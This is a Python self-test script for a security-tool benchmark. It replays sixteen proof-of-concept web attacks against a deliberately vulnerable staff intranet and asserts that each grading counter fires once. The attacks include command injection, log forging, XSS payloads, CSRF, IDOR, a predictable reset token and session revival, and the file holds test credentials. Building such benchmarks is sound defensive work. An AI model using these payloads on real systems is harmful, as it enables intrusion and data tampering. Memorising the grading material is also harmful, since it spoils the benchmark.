#!/usr/bin/env python3
"""Replay every catalog PoC for the intranet target and assert each counter fires once.

This is what stops the corpus being decorative. An entry whose PoC no longer does
anything is worse than no entry at all: every tool silently loses a point it could
never have won, and "nobody found it" becomes indistinguishable from "it is hard".

Three assertions, and the third is the one that is easy to get wrong:

* every catalog entry's counter moved,
* it moved exactly once -- twice usually means a sink is counting the payload rather
  than the effect, which would let a tool score by spraying,
* every counter came back carrying a peer address. One sink here hands its work to a
  thread pool, and a pool does not carry the request context unless the callable is
  bound to it. A counter that arrives with no peer is indistinguishable from a
  legitimate background job, so nothing downstream can fail safe on it, and this
  replay would end up credited to whichever tool's run happens to be open.

Identification of this traffic as the platform's own is by SOURCE ADDRESS, not by any
marker header: run it from the internal network, whose range the application has in
TELEMETRY_SYNTHETIC_CIDRS. A marker header would be visible to a tool through any
reflection or header-injection flaw and would hand it the shape of the grader.

The target must be freshly reset before this runs, and reset again after it:

    docker compose exec intranet-hub /usr/local/bin/state-reset
    ... run this ...
    docker compose exec intranet-hub /usr/local/bin/state-reset

Several of the counters here are de-duplicated the way ordinary anomaly counters are
(once per revived session, once per piece of equipment), so a second replay against an
estate that was not reset in between legitimately reports zero for those.

Usage
-----
    python3 targets/intranet/selftest.py                # replay + assertions
    python3 targets/intranet/selftest.py --no-collector # replay only

Run it from a container that sits on the estate's own network -- the resolver is the
one place with both a route to the application and loopback access to the platform:

    docker compose exec resolver python /w/targets/intranet/selftest.py

WHICH ADDRESS TO USE, AND WHY IT IS NOT THE ONE STAFF TYPE
---------------------------------------------------------
The service answers to two names: the hostname the staff use, on their network, and
`staff-services` on the estate's own. This replay must use the second. Traffic is
classified as the platform's own by SOURCE ADDRESS, and the source address is decided
by the interface the name resolved to: over the internal name the connection comes
from the estate range the application has in TELEMETRY_SYNTHETIC_CIDRS and is recorded
as ours, while over the staff hostname it would arrive looking exactly like a tool's
crawl -- and this replay, which fires every counter in the catalog by construction,
would be credited to whichever tool's run happens to be open.

Environment
-----------
    INTRANET_BASE_URL    default http://staff-services   (the internal name, port 80)
    TELEMETRY_ENDPOINT   default http://otel-collector:8900
"""

from __future__ import annotations

import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import os

BASE = os.environ.get("INTRANET_BASE_URL", "http://staff-services").rstrip("/")
ENDPOINT = os.environ.get("TELEMETRY_ENDPOINT", "http://otel-collector:8900").rstrip("/")
DOMAIN = os.environ.get("SITE_DOMAIN", "lanmarkfreight.net")
CATALOG = Path(__file__).resolve().parents[2] / "catalog" / "vulns"

USER = (f"j.hollis@{DOMAIN}", "harbour-lantern-5183")
OTHER = (f"p.rasmussen@{DOMAIN}", "cobble-thicket-2947")
OPS = (f"s.varga@{DOMAIN}", "Wharfside-Beacon!41")


# ---------------------------------------------------------------------------
# catalog: id <-> signal
# ---------------------------------------------------------------------------

def load_signals() -> dict[str, str]:
    """Map catalog id -> oracle.signal without needing a YAML parser.

    The assertions are written against signals because that is all a compliant target
    emits; the catalog is the only place the mapping back to an id exists.
    """
    out: dict[str, str] = {}
    for path in sorted(CATALOG.glob("BENCH-INTR-*.yaml")):
        text = path.read_text(encoding="utf-8")
        vid = re.search(r"^id:\s*(\S+)", text, re.M)
        sig = re.search(r"^\s*signal:\s*(\S+)", text, re.M)
        if vid and sig:
            out[vid.group(1)] = sig.group(1).strip("\"'")
    return out


# ---------------------------------------------------------------------------
# a cookie jar small enough to read
# ---------------------------------------------------------------------------

class Browser:
    def __init__(self) -> None:
        self.cookies: dict[str, str] = {}

    def request(self, method: str, path: str, *, form: dict | None = None,
                headers: dict | None = None, raw: bytes | None = None) -> tuple[int, str]:
        url = BASE + path
        body = raw
        sent = dict(headers or {})
        if form is not None and raw is None:
            body = urllib.parse.urlencode(form).encode()
            sent.setdefault("Content-Type", "application/x-www-form-urlencoded")
        if self.cookies:
            sent["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        req = urllib.request.Request(url, data=body, method=method, headers=sent)
        opener = urllib.request.build_opener(_NoRedirect)
        try:
            with opener.open(req, timeout=20) as response:
                self._take_cookies(response.headers.get_all("Set-Cookie") or [])
                return response.status, response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as failed:
            self._take_cookies(failed.headers.get_all("Set-Cookie") or [])
            return failed.code, failed.read().decode("utf-8", "replace")

    def _take_cookies(self, lines: list[str]) -> None:
        for line in lines:
            pair = line.split(";", 1)[0]
            if "=" not in pair:
                continue
            name, value = pair.split("=", 1)
            if value.strip():
                self.cookies[name.strip()] = value.strip()
            else:
                self.cookies.pop(name.strip(), None)

    def get(self, path: str, **kwargs) -> tuple[int, str]:
        return self.request("GET", path, **kwargs)

    def post(self, path: str, **kwargs) -> tuple[int, str]:
        return self.request("POST", path, **kwargs)

    def sign_in(self, who: tuple[str, str]) -> "Browser":
        status, _ = self.post("/login", form={"email": who[0], "password": who[1]})
        if status not in (200, 302):
            raise RuntimeError(f"sign-in for {who[0]} returned {status}")
        if "hubsid" not in self.cookies:
            raise RuntimeError(f"sign-in for {who[0]} returned no session cookie")
        return self

    def form_token(self) -> str:
        _, page = self.get("/account")
        found = re.search(r'name="ft" value="([0-9a-f]{32})"', page)
        if not found:
            raise RuntimeError("no form token on the account screen")
        return found.group(1)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Follow nothing: a 302 after a sign-in is the answer, not a detour."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


# ---------------------------------------------------------------------------
# the replays, one per catalog entry
# ---------------------------------------------------------------------------

def poc_0001(sessions) -> None:
    """Blind command injection in the equipment probe."""
    sessions["ops"].post("/parts/inventory/asset/4/probe",
                         form={"host": f"ap-yard-01.{DOMAIN};id"})


def poc_0002(_sessions) -> None:
    """A forged record in the sign-in log."""
    forged = (f"nobody@{DOMAIN}\n2026-01-06T09:14:22Z INFO auth.signin outcome=ok "
              f"actor=s.varga@{DOMAIN} net=10.0.0.9")
    Browser().post("/login", form={"email": forged, "password": "no"})


def poc_0003(sessions) -> None:
    """The sort order breaks out of the chip's unquoted attribute."""
    sessions["user"].get("/parts/directory/filter?team=Depot%20Operations"
                         "&sort=az%20onmouseover=fetch(1)")


def poc_0004(sessions) -> None:
    """A colleague's leave request is written by somebody with no claim on it."""
    sessions["user"].post("/parts/leave/request/4102/edit",
                          form={"start_date": "2026-03-02", "end_date": "2026-03-06",
                                "reason": "Moved"})


def poc_0005(_sessions) -> None:
    """The queue console draws for an account that is not operations."""
    Browser().get("/admin/console/queues")


def poc_0006(sessions) -> None:
    """A delegation committed from another site with no form token."""
    sessions["user"].post("/parts/leave/delegate", form={"delegate_to": OTHER[0]},
                          headers={"Origin": "https://staff-notices.example",
                                   "Referer": "https://staff-notices.example/holiday"})


def poc_0007(_sessions) -> None:
    """A reset link the application never handed out."""
    desk = Browser()
    _, page = desk.post("/parts/account/reset-request", form={"email": USER[0]})
    issued = re.search(r"/account/reset/([0-9a-f]+)", page)
    if not issued:
        raise RuntimeError("the reset screen did not show a link")
    mine = issued.group(1)
    # Same hour, another staff number: the link is recomputed rather than looked up.
    Browser().get("/account/reset/1042" + mine[4:])


def poc_0008(_sessions) -> None:
    """A session that was signed out still authenticates."""
    dead = Browser().sign_in(USER)
    cookie = dead.cookies["hubsid"]
    dead.post("/logout")
    revived = Browser()
    revived.cookies["hubsid"] = cookie
    revived.get("/parts/dashboard/summary")


def poc_0009(sessions) -> None:
    """The approvals console drawn inside another site's frame."""
    sessions["user"].get("/leave/approvals",
                         headers={"Sec-Fetch-Dest": "iframe", "Sec-Fetch-Site": "cross-site",
                                  "Sec-Fetch-Mode": "navigate"})


def poc_0010(sessions) -> None:
    """A draft claim paid without ever having been reviewed."""
    sessions["user"].post("/parts/expenses/claim/8815/reimburse")


def poc_0011(sessions) -> None:
    """A receipt served because the rule could not be taken."""
    sessions["other"].get("/parts/expenses/claim/8821/receipt?as_of=not-a-date")


def poc_0012(sessions) -> None:
    """A role change that leaves no record behind it."""
    sessions["ops"].post("/parts/directory/person/1024/access", form={"role": "approver"})


def poc_0013(sessions) -> None:
    """A stored label that escapes the attribute carrying the card's parameters."""
    sessions["user"].post("/parts/inventory/asset/4/label",
                          form={"label": "spare' hx-on:load='fetch(1)"})


def poc_0014(sessions) -> None:
    """A forged decision in the approvals log."""
    forged = ("ok\n2026-01-06T11:00:00Z INFO leave.decision request=4101 "
              f"actor=r.achterberg@{DOMAIN} verdict=approved")
    sessions["user"].post("/parts/leave/request/4101/comment", form={"comment": forged})


def poc_0015(sessions) -> None:
    """An expense line attached to somebody else's claim."""
    sessions["other"].post("/parts/expenses/claim/8822/lines",
                           form={"description": "Hotel single room", "amount": "94.00",
                                 "category": "Accommodation"})


def poc_0016(_sessions) -> None:
    """The headcount file collected without a session."""
    Browser().get("/admin/reports/headcount.csv")


POCS = [
    ("BENCH-INTR-0001", poc_0001),
    ("BENCH-INTR-0002", poc_0002),
    ("BENCH-INTR-0003", poc_0003),
    ("BENCH-INTR-0004", poc_0004),
    ("BENCH-INTR-0005", poc_0005),
    ("BENCH-INTR-0006", poc_0006),
    ("BENCH-INTR-0007", poc_0007),
    ("BENCH-INTR-0008", poc_0008),
    ("BENCH-INTR-0009", poc_0009),
    ("BENCH-INTR-0010", poc_0010),
    ("BENCH-INTR-0011", poc_0011),
    ("BENCH-INTR-0012", poc_0012),
    ("BENCH-INTR-0013", poc_0013),
    ("BENCH-INTR-0014", poc_0014),
    ("BENCH-INTR-0015", poc_0015),
    ("BENCH-INTR-0016", poc_0016),
]


# ---------------------------------------------------------------------------
# platform API
# ---------------------------------------------------------------------------

def api(method: str, path: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(ENDPOINT + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=20) as response:
        payload = response.read()
    return json.loads(payload) if payload else None


def main() -> int:
    signals = load_signals()
    missing = [vid for vid, _ in POCS if vid not in signals]
    if missing:
        print(f"catalog entries without a signal: {', '.join(missing)}", file=sys.stderr)
        return 2
    known = {name: vid for vid, name in signals.items()}

    use_api = "--no-collector" not in sys.argv
    run_id = None
    if use_api:
        try:
            run = api("POST", "/v1/runs", {
                "tool": "selftest",
                "profile": "intranet-poc-replay",
                "targets": ["intranet"],
                "notes": "targets/intranet/selftest.py",
                "force": True,
            })
            run_id = run["run_id"]
            print(f"run {run_id}")
        except (urllib.error.URLError, OSError) as failure:
            print(f"cannot reach the platform API at {ENDPOINT}: {failure}", file=sys.stderr)
            print("re-run with --no-collector to replay without assertions", file=sys.stderr)
            return 2

    try:
        sessions = {
            "user": Browser().sign_in(USER),
            "other": Browser().sign_in(OTHER),
            "ops": Browser().sign_in(OPS),
        }
    except (RuntimeError, urllib.error.URLError, OSError) as failure:
        print(f"could not sign in against {BASE}: {failure}", file=sys.stderr)
        return 2

    for vuln_id, replay in POCS:
        print(f"  replaying {vuln_id} ... ", end="", flush=True)
        try:
            replay(sessions)
            print("sent")
        except (RuntimeError, urllib.error.URLError, OSError) as failure:
            print(f"FAILED to send: {failure}")

    if not use_api:
        print("replay done (no assertions)")
        return 0

    # The agent batches for a quarter of a second; the probe finishes on its own pool.
    time.sleep(3)

    api("POST", f"/v1/runs/{run_id}/close")
    page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=50000")
    events = page.get("events", []) if isinstance(page, dict) else []

    counts: dict[str, int] = {}
    peerless: dict[str, int] = {}
    details: dict[str, str] = {}
    for event in events:
        record = event.get("payload", event) if isinstance(event.get("payload"), dict) else event
        name = record.get("signal")
        if not name:
            continue
        counts[name] = counts.get(name, 0) + 1
        if not record.get("peer_ip") or record.get("peer_missing"):
            peerless[name] = peerless.get(name, 0) + 1
        attributes = record.get("attributes") or record.get("evidence") or {}
        if attributes.get("detail") and name not in details:
            details[name] = attributes["detail"]

    print()
    failures: list[str] = []
    for vuln_id, _ in POCS:
        name = signals[vuln_id]
        seen = counts.get(name, 0)
        lost = peerless.get(name, 0)
        state = "ok  " if seen == 1 and not lost else "FAIL"
        print(f"{state} {vuln_id}  {name}  count={seen}"
              + (f"  no-peer={lost}" if lost else ""))
        if name in details:
            print(f"       {details[name][:300]}")
        if seen != 1 or lost:
            failures.append(vuln_id)

    for name in sorted(set(counts) - set(known)):
        print(f"FAIL unexpected counter {name} ({counts[name]}) - another target's?")
        failures.append(name)

    print()
    if failures:
        print(f"{len(failures)} of {len(POCS)} entries did not come back clean")
        print("count 0: the code path no longer does what the entry describes, or the PoC "
              "needs a freshly reset target (several of these are counted once per record).")
        print("count >1: something is counting the payload rather than the effect, which "
              "would hand tools free points.")
        print("no-peer: a sink lost its request context - work handed to a pool without "
              "being bound to the request. This replay would be credited to whichever "
              "tool's run is open.")
        return 1

    print(f"all {len(POCS)} intranet counters fired exactly once, each carrying a peer")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
